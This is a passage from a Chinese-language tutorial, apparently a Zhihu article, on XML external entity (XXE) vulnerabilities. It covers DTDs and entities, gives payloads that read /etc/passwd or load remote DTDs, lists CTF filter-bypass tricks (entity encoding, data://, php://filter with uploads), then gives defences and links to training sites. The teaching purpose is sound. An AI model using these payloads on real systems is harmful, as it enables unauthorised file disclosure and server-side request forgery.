声明、DTD 文档类型定义（可选）、文档元素。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--XML申明--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--文档类型定义--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE note [  &amp;lt;!--定义此文档是 note 类型的文档--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;&amp;lt;!--定义note元素有四个元素--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ELEMENT to (#PCDATA)&amp;gt;&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;&amp;lt;!--定义to元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ELEMENT from (#PCDATA)&amp;gt;&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;&amp;lt;!--定义from元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ELEMENT head (#PCDATA)&amp;gt;&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;&amp;lt;!--定义head元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ELEMENT body (#PCDATA)&amp;gt;&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;&amp;lt;!--定义body元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;
]]]&amp;gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--文档元素--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;note&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;to&amp;gt;&lt;/span&gt;Zhihu&lt;span class=&quot;nt&quot;&gt;&amp;lt;/to&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;from&amp;gt;&lt;/span&gt;Twosecurity&lt;span class=&quot;nt&quot;&gt;&amp;lt;/from&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;Hello&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;Nice to meet you&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/note&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;XXE 漏洞其中的 DTD 文档相关。&lt;/p&gt;&lt;h3&gt;&lt;b&gt;DTD&lt;/b&gt;&lt;/h3&gt;&lt;p&gt;文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。&lt;/p&gt;&lt;blockquote&gt;DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。&lt;/blockquote&gt;&lt;p&gt;内部声明DTD：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE 根元素 [元素声明]&amp;gt;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;引用外部DTD：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE 根元素 SYSTEM &amp;#34;文件名&amp;#34;&amp;gt;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;DTD文档中有很多重要的关键字如下： &lt;/p&gt;&lt;ul&gt;&lt;li&gt;DOCTYPE（DTD的声明）&lt;/li&gt;&lt;li&gt;ENTITY（实体的声明）&lt;/li&gt;&lt;li&gt;SYSTEM、PUBLIC（外部资源申请）&lt;/li&gt;&lt;/ul&gt;&lt;h3&gt;&lt;b&gt;实体&lt;/b&gt;&lt;/h3&gt;&lt;p&gt;实体可以理解为变量，其必须在 DTD 中定义申明，可以在文档中的其他位置引用该变量的值。实体按类型主要分为以下四种：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;内置实体 (Built-in entities)&lt;/li&gt;&lt;li&gt;字符实体 (Character entities)&lt;/li&gt;&lt;li&gt;通用实体 (General entities)&lt;/li&gt;&lt;li&gt;参数实体 (Parameter entities)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;实体根据引用方式，还可分为 内部实体 与 外部实体：&lt;/p&gt;&lt;p&gt;内部实体：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY 实体名称 &amp;#34;实体的值&amp;#34;&amp;gt;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;外部实体: &lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY 实体名称 SYSTEM &amp;#34;URI&amp;#34;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;&lt;b&gt;外部实体&lt;/b&gt;&lt;/h3&gt;&lt;p&gt;外部实体即在DTD中使用&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY 实体名称 SYSTEM &amp;#34;URI&amp;#34;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;实例演示：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE a [
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;    &amp;lt;!ENTITY b SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&lt;/span&gt;]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;foo&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;b;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/foo&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;举一个简单的 XXE&lt;/b&gt;&lt;/p&gt;&lt;p&gt;传输数据的 XML 文档 demo：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE root [
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;    &amp;lt;!ELEMENT name (#PCDATA)&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ELEMENT pass (#PCDATA)&amp;gt;&lt;/span&gt; 
]&amp;gt; 
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt; 
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;admin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt; 
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;pass&amp;gt;&lt;/span&gt;password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pass&amp;gt;&lt;/span&gt; 
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果在这里使用外部实体&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; ?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE test [
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;    &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&lt;/span&gt;
 ]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;test&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/test&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;另一种是调用 dtd 文档的&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE test [ 
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;    &amp;lt;!ENTITY %file SYSTEM &amp;#34;http://127.0.0.1/test.dtd&amp;#34;&amp;gt;&lt;/span&gt;
    %file;
]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;test&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/test&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;test.dtd 的内容为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#39;file:///etc/passwd&amp;#39;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;XXE 绕过姿势&lt;/h2&gt;&lt;p&gt;整理众多 CTF 大赛中的 XXE 题，这里汇总了一些常用的绕过姿势（若有错误、不全，欢迎大佬评论区指正，小弟感激不尽🤝）&lt;/p&gt;&lt;p&gt;&lt;b&gt;大小写绕过&lt;/b&gt;&lt;/p&gt;&lt;p&gt;利用其正则匹配的不严格，通过大小写绕过&lt;/p&gt;&lt;p&gt;&lt;b&gt;html 实体编码绕过&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果过滤了http等协议，可以利用实体编码绕过：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE test [ 
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % a &amp;#34; 
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;    &amp;lt;!ENTITY %  b SYSTEM &amp;#39;http://127.0.0.1/test.dtd&amp;#39;&amp;gt;&lt;/span&gt; 
&amp;#34;&amp;gt; 
    %a;
    %b; 
]&amp;gt; 
&lt;span class=&quot;nt&quot;&gt;&amp;lt;test&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/test&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;data:// 协议绕过&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE test [
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;    &amp;lt;!ENTITY % a SYSTEM &amp;#34;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMjcuMC4wLjEvaGFjay5kdGQnPg==&amp;#34;&amp;gt;&lt;/span&gt; 
    %a; 
    %b; 
]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;test&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/test&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--编码内容--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % b SYSTEM &amp;#39;http://127.0.0.1/test.dtd&amp;#39;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;file:// 协议加文件上传&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE test [ 
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;    &amp;lt;!ENTITY % a SYSTEM &amp;#34;file:///var/www/uploads/test.jpg&amp;#34;&amp;gt;&lt;/span&gt;
    %a; 
]&amp;gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--上传文件--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % b SYSTEM &amp;#39;http://127.0.0.1/test.dtd&amp;#39;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;php://filter协议加文件上传&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE test [ 
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;    &amp;lt;!ENTITY % a SYSTEM &amp;#34;php://filter/resource=/var/www/uploads/test.jpg&amp;#34;&amp;gt;&lt;/span&gt;
    %a;
]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;test&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/test&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--上传文件--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#39;php://filter/read=convert.base64-encode/resource=./flag.php&amp;#39;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进行编码：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE test [
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;    &amp;lt;!ENTITY % a SYSTEM &amp;#34;php://filter/read=convert.base64-decode/resource=/var/www/uploads/test.jpg&amp;#34;&amp;gt;&lt;/span&gt;
    %a;
]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;test&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/test&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--上传文件--&amp;gt;&lt;/span&gt;
PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;XXE 漏洞修复与防御&lt;/h2&gt;&lt;p&gt;1️⃣推荐使用开发语言提供的禁用外部实体的方法。&lt;/p&gt;&lt;p&gt;PHP：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;libxml_disable_entity_loader(true);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;JAVA: &lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;n&quot;&gt;DocumentBuilderFactory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DocumentBuilderFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dbf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setExpandEntityReferences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Python：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;lxml&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;xmlData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xmlSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XMLParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resolve_entities&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2️⃣过滤用户提交的 XML 数据&lt;/p&gt;&lt;p&gt;过滤关键词：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&amp;lt;!DOCTYPE&lt;/li&gt;&lt;li&gt;&amp;lt;!ENTITY&lt;/li&gt;&lt;li&gt;SYSTEM&lt;/li&gt;&lt;li&gt;PUBLIC&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;有关 &lt;b&gt;Chrome 插件、XXE &lt;/b&gt;的内容就简单介绍到这里。更多有关 XXE 漏洞的知识拓展请前往 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;附（够吃一个月的纯干粮）（若无法访问评论区戳我💡）：&lt;/h2&gt;&lt;h2&gt;训练场&lt;/h2&gt;&lt;p&gt;&lt;b&gt;CG CTF&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-00959d82ac819f36ceb900b175f300a9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1872&quot; data-rawheight=&quot;897&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1872&quot; data-original=&quot;https://pic2.zhimg.com/v2-00959d82ac819f36ceb900b175f300a9_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-00959d82ac819f36ceb900b175f300a9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1872&quot; data-rawheight=&quot;897&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1872&quot; data-original=&quot;https://pic2.zhimg.com/v2-00959d82ac819f36ceb900b175f300a9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-00959d82ac819f36ceb900b175f300a9_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//cgctf.nuptsast.com/challenges%23Web&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;CG-CTF&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;二向箔安全训练场&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d86c7a597d7b585d0e9cbc06c5f46573_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1697&quot; data-rawheight=&quot;805&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1697&quot; data-original=&quot;https://pic4.zhimg.com/v2-d86c7a597d7b585d0e9cbc06c5f46573_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d86c7a597d7b585d0e9cbc06c5f46573_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1697&quot; data-rawheight=&quot;805&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1697&quot; data-original=&quot;https://pic4.zhimg.com/v2-d86c7a597d7b585d0e9cbc06c5f46573_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d86c7a597d7b585d0e9cbc06c5f46573_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/courseTask.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;twosecurity.cn/courseTa&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;sk.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Hacker101&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0578b3344bd7cfc8fd7365285c0ddc71_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;512&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;899&quot; data-original=&quot;https://pic2.zhimg.com/v2-0578b3344bd7cfc8fd7365285c0ddc71_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0578b3344bd7cfc8fd7365285c0ddc71_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;512&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;899&quot; data-original=&quot;https://pic2.zhimg.com/v2-0578b3344bd7cfc8fd7365285c0ddc71_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-0578b3344bd7cfc8fd7365285c0ddc71_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/Hacker0x01/hacker101&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/Hacker0x01/h&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;acker101&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Jarvis OJ（贾维斯）&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2f2526ffe6952e33d62b20e9e1d52689_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1879&quot; data-rawheight=&quot;526&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1879&quot; data-original=&quot;https://pic2.zhimg.com/v2-2f2526ffe6952e33d62b20e9e1d52689_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2f2526ffe6952e33d62b20e9e1d52689_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1879&quot; data-rawheight=&quot;526&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1879&quot; data-original=&quot;https://pic2.zhimg.com/v2-2f2526ffe6952e33d62b20e9e1d52689_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-2f2526ffe6952e33d62b20e9e1d52689_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.jarvisoj.com/challenges&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;jarvisoj.com/challenges&lt;/span&gt;&lt;span 